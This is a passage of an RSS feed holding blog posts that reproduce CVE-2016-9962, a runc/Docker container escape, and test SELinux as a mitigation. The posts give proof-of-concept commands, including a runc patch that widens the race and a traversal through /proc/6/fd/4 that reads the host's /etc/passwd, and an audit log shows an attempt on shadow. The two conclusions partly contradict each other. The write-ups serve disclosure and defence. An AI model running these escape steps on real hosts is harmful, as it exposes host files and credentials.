&lt;pre&gt;&lt;code&gt;    type=AVC msg=audit(1485143502.183:3311): avc:  denied  { read } for  pid=9418 comm=&amp;quot;cat&amp;quot; name=&amp;quot;shadow&amp;quot; dev=&amp;quot;dm-0&amp;quot; ino=785423 scontext=unconfined_u:system_r:container_t:s0-s0:c0.c1023 tcontext=system_u:object_r:shadow_t:s0 tclass=file permissive=0
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we know from PoC that we could mitigate CVE-2016-9962 by enabling SELinux.&lt;/p&gt;

&lt;p&gt;So we should enable SELinux in container environment also and making more
safety(and keeping to have mitigate way even if in 0-day situation)
environment.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Docker vulnerability (CVE-2016-9962) PoC with SELinux</title>
      <link>https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/</link>
      <pubDate>Tue, 17 Jan 2017 03:27:40 +0900</pubDate>
      
      <guid>https://jsoss-sig.github.io/post/omok-selinux-docker-20170118/</guid>
      <description>

&lt;p&gt;Here we described how to reproduce CVE-2016-9962(vulnerability for Docker) and
how can we protect it by using SELinux.&lt;/p&gt;

&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;

&lt;h4 id=&#34;https-bugzilla-redhat-com-show-bug-cgi-id-1409531&#34;&gt;&lt;a href=&#34;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&#34;&gt;https://bugzilla.redhat.com/show_bug.cgi?id=1409531&lt;/a&gt;&lt;/h4&gt;

&lt;h4 id=&#34;https-bugzilla-suse-com-show-bug-cgi-id-1012568-c2&#34;&gt;&lt;a href=&#34;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&#34;&gt;https://bugzilla.suse.com/show_bug.cgi?id=1012568#c2&lt;/a&gt;&lt;/h4&gt;

&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;

&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used Fedora25 for this PoC.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This vulnerability is quite hard to reproduce because there&amp;rsquo;s not so much race
window on runc. Also, we need to add &amp;ldquo;CAP_SYS_PTRACE&amp;rdquo; to container for
checking other container&amp;rsquo;s status.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Install docker, runc on your PC.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -qa|grep -i docker
golang-github-fsouza-go-dockerclient-devel-0.2.1-17.git2350d7b.fc25.noarch
golang-github-docker-go-unit-test-devel-1.5.1-0.3.gitd30aec9.fc25.x86_64
golang-github-docker-go-devel-1.5.1-0.3.gitd30aec9.fc25.noarch
docker-devel-1.12.6-3.git51ef5a8.fc25.noarch
golang-github-docker-libcontainer-devel-2.1.1-0.8.gitc964368.fc25.noarch
docker-1.12.6-4.gitf499e8b.fc25.x86_64
golang-github-docker-libcontainer-2.1.1-0.8.gitc964368.fc25.x86_64
golang-github-docker-go-connections-devel-0.1.2-0.2.git6e4c13d.fc25.noarch
docker-common-1.12.6-4.gitf499e8b.fc25.x86_64
golang-github-docker-go-connections-unit-test-devel-0.1.2-0.2.git6e4c13d.fc25.x86_64
golang-github-docker-go-units-devel-0.2.0-3.fc25.noarch
[root@localhost ~]# rpm -qa|grep -i runc
runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64
runc-devel-0.1.1-4.git57b9972.fc25.noarch
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Start docker.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# systemctl start docker
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Use &amp;ldquo;alpine&amp;rdquo; image for PoC.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker pull alpine
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create alpine image (named &amp;ldquo;alpine&amp;rdquo;)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker create alpine --name alpine
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;check new alpine container name by using &amp;ldquo;docker ps -a&amp;rdquo;. In below situation
, &amp;ldquo;small_lumiere&amp;rdquo; is the name.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# docker ps -a
[root@localhost ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED         
STATUS              PORTS               NAMES
965456106c88        alpine              &amp;quot;--name alpine&amp;quot;     6 hours ago     
Created                                 small_lumiere
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create &amp;ldquo;rootfs&amp;rdquo; directory and copy all of alpine file under rootfs/&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# mkdir rootfs
[root@localhost ~]# docker export small_lumiere |tar xvfC - rootfs
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;create config.json&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc spec
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;modify config.json for assign CAP_SYS_PTRACE capability.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                &amp;quot;capabilities&amp;quot;: [
                    &amp;quot;CAP_AUDIT_WRITE&amp;quot;,
                    &amp;quot;CAP_KILL&amp;quot;,
                    &amp;quot;CAP_SYS_PTRACE&amp;quot;,
                    &amp;quot;CAP_NET_BIND_SERVICE&amp;quot;
            ],
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;For PoC, we will modify runc source. Get/install runc SRPM and modify source code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -ivh /tmp/runc-1.0.0-3.rc2.gitc91b5be.fc25.src.rpm
[root@localhost ~]# cd SOURCES/
[root@localhost ~]# ls
runc-c91b5be.tar.gz
[root@localhost ~]#
[root@localhost ~]# mkdir ../work
[root@localhost ~]# cd ../work/
[root@localhost ~]# tar -xvzf ../SOURCES/runc-c91b5be.tar.gz
[root@localhost ~]# cd runc-c91b5bea4830a57eac7882d7455d59518cdf70ec/
[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# ls
CONTRIBUTING.md       VERSION        main.go              script
Dockerfile            checkpoint.go  main_solaris.go      signals.go
Godeps                contrib        main_unix.go         spec.go
LICENSE               create.go      main_unsupported.go  start.go
MAINTAINERS           delete.go      man                  state.go
MAINTAINERS_GUIDE.md  events.go      pause.go             tests
Makefile              exec.go        ps.go                tty.go
NOTICE                kill.go        restore.go           update.go
PRINCIPLES.md         libcontainer   rlimit_linux.go      utils.go
README.md             list.go        run.go               utils_linux.go
[root@localhost runc-c91b5bea4830a57eac7882d7455d59518cdf70ec]# vi libcontainer/setns_init_linux.go 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We add 2 lines ;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost libcontainer]# diff -Nru setns_init_linux.go setns_init_linux.go.org 
    --- setns_init_linux.go     2017-01-16 15:26:01.067477093 +0900
    +++ setns_init_linux.go.org 2017-01-16 15:25:22.921553094 +0900
    @@ -5,6 +5,7 @@
import (
    &amp;quot;fmt&amp;quot;
    &amp;quot;os&amp;quot;
+   &amp;quot;time&amp;quot;

    &amp;quot;github.com/opencontainers/runc/libcontainer/apparmor&amp;quot;
    &amp;quot;github.com/opencontainers/runc/libcontainer/keys&amp;quot;
    @@ -49,5 +50,6 @@
    if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil {
        return err
    }
+   time.Sleep(500 * time.Second)
    return system.Execv(l.config.Args[0], l.config.Args[0:], os.Environ())
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;make tar.gz and re-create runc package by using rpmbuild.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost work]# tar -cvfrunc-c91b5be.tar runc-c91b5bea4830a57eac7882d7455d59518cdf70ec
[root@localhost work]# gzip runc-c91b5be.tar
[root@localhost work]# cp runc-c91b5be.tar.gz ../SOURCES
[root@localhost work]# cd ../SPECS/
[root@localhost SPECS]# rpmbuild -ba runc.spec
[root@localhost SPECS]# cd ~
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;uninstall and re-install modified runc package;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# rpm -e runc
[root@localhost ~]# rpm -ivh rpmbuild/RPMS/x86_64/runc-1.0.0-3.rc2.gitc91b5be.fc25.x86_64.rpm
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;open 2 terminals(shell1, shell2).&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check SELinux is enabled;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# getenforce
Enforcing
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run container(sh) in shell1;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run new container in shell2 with &amp;ldquo;runc exec&amp;rdquo; command. It is pausing 500sec;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;run &amp;ldquo;ps ax&amp;rdquo; in shell1. You can see shell2 process;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[root@localhost ~]# runc run ctr
/ # ps ax
PID   USER     TIME   COMMAND
    1 root       0:00 sh
    6 root       0:00 /proc/self/exe init
   11 root       0:00 ps ax
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In above case, check /proc/6/fd by ls command. You see path as fd/4;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -la /proc/6/fd/
total 0
dr-x------    2 root     root             0 Jan 16 06:43 .
dr-xr-xr-x    9 root     root             0 Jan 16 06:43 ..
lrwx------    1 root     root            64 Jan 16 06:43 0 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 1 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 2 -&amp;gt; /dev/pts/4
lrwx------    1 root     root            64 Jan 16 06:43 3 -&amp;gt; socket:[40487]
lr-x------    1 root     root            64 Jan 16 06:43 4 -&amp;gt; /run/runc/ctr
lrwx------    1 root     root            64 Jan 16 06:43 5 -&amp;gt; /dev/pts/4
lr-x------    1 root     root            64 Jan 16 06:43 6 -&amp;gt; pipe:[40496]
l-wx------    1 root     root            64 Jan 16 06:43 7 -&amp;gt; /dev/null
/ # 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Check &amp;ldquo;/proc/6/fd/4/../../..&amp;rdquo; by ls command. You can see parent(host) / filesystem;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # ls -l /proc/6/fd/4/../../..
total 64
lrwxrwxrwx    1 root     root             7 Feb  3  2016 bin -&amp;gt; usr/bin
dr-xr-xr-x    6 root     root          4096 Jan 16 00:07 boot
drwxr-xr-x   19 root     root          3840 Jan 16 05:57 dev
drwxr-xr-x  130 root     root         12288 Jan 16 05:40 etc
drwxr-xr-x    3 root     root          4096 Oct 12 22:55 home
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;You can also read /etc/passwd by using &amp;ldquo;cat /proc/6/fd/4/../../../etc&amp;rdquo;;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/ # cat /proc/6/fd/4/../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Now we could see that CVE-2016-9962 PoC is successfull even if SELinux is
enforcing. But we think this vulnerability is not critical because;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;The race window is quite narrow(then we needed to modify runc source.)&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;We also need to add &amp;ldquo;CAP_SYS_PTRACE&amp;rdquo; on the container(it is removed in defau
lt.)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
  </channel>
</rss>